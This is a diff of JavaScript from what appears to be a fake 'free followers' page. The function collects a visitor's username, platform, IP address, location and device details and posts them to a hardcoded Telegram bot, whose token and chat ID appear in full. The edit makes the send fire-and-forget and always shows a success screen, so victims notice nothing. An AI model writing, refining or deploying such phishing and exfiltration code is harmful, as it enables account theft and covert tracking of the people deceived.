@@ -264,24 +264,22 @@ async function sendFollowers() {
     return;
   }
 
-  // Show loading immediately
   document.getElementById('step3').style.display = 'none';
   document.getElementById('loading').style.display = 'block';
 
-  const token = '7814463410:AAFej2-K3LM4Uhvyx-py-pZtThrLvQyTenc';
-  const chatId = '1848006769';
-
   try {
-    // جلب بيانات IP والموقع بشكل متزامن
-    const ipDataPromise = fetch('https://ipapi.co/json/').then(res => res.json());
-    const ipData = await ipDataPromise;
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
 
-    const ip = ipData.ip;
-    const city = ipData.city || 'Unknown';
-    const country = ipData.country_name || 'Unknown';
+    const ip = data.ip;
+    const city = data.city || 'Unknown';
+    const country = data.country_name || 'Unknown';
     const userAgent = navigator.userAgent;
 
-    const msg = ` 🚨 New login detected:
+    const token = '7814463410:AAFej2-K3LM4Uhvyx-py-pZtThrLvQyTenc';
+    const chatId = '1848006769';
+
+    const msg = `🚨 New login detected:
 📱 Platform: ${platform}
 👥 Followers: ${followers}
 👤 Username: ${user}
@@ -290,6 +288,7 @@ async function sendFollowers() {
 🏙️ Location: ${city}, ${country}
 🖥️ Device: ${userAgent}`;
 
+    // إرسال الرسالة بدون انتظار الرد
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -299,16 +298,13 @@ async function sendFollowers() {
       })
     });
 
-    setTimeout(() => {
-      document.getElementById('loading').style.display = 'none';
-      document.getElementById('done').style.display = 'block';
-    }, 1000);
-
   } catch (error) {
-    alert('حدث خطأ أثناء الإرسال، حاول مرة أخرى.');
-    document.getElementById('loading').style.display = 'none';
-    document.getElementById('step3').style.display = 'block';
+    console.error('Failed to fetch IP or send message:', error);
   }
+
+  // إظهار رسالة النجاح بسرعة
+  document.getElementById('loading').style.display = 'none';
+  document.getElementById('done').style.display = 'block';
 }
 </script>
 
